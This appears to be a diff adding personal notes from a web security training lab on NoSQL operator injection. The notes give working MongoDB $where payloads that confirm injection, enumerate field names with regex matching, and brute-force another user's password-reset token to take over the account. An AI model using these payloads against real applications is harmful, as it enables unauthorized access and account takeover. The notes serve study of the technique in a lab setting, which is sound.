@@ -1,0 +1,39 @@
+To test whether you can inject operators, you could try adding the 
+$where operator as an additional parameter, then send one request where the 
+condition evaluates to false, and another that evaluates to true. 
+For example:
+
+{"username":"wiener","password":"peter", "$where":"0"}
+
+{"username":"wiener","password":"peter", "$where":"1"}
+
+If there is a difference between the responses, this may indicate that the 
+JavaScript expression in the $where clause is being evaluated.
+
+using the keys() method to extract data:
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+
+This inspects the first data field in the user object and 
+returns the first character of the field name.
+
+
+"$where":"Object.keys(this)[1].match('^.{}.*')"
+this gives us that there is a field called "username"
+
+
+found the password reset field with this:
+"$where":"Object.keys(this)[4].match('^.{§§}§§.*')"
+
+
+using the intruder of the POST /login request we will use this to get carlos' 
+password reset token:
+"$where":"this.changePwd.match('^.{§§}§§.*')"
+
+from this we eventually get:
+db4b8723694a63b7
+
+so inputing /forgot-password?changePwd=db4b8723694a63b7
+
+allows us to log into the change password account of carlos
+
+
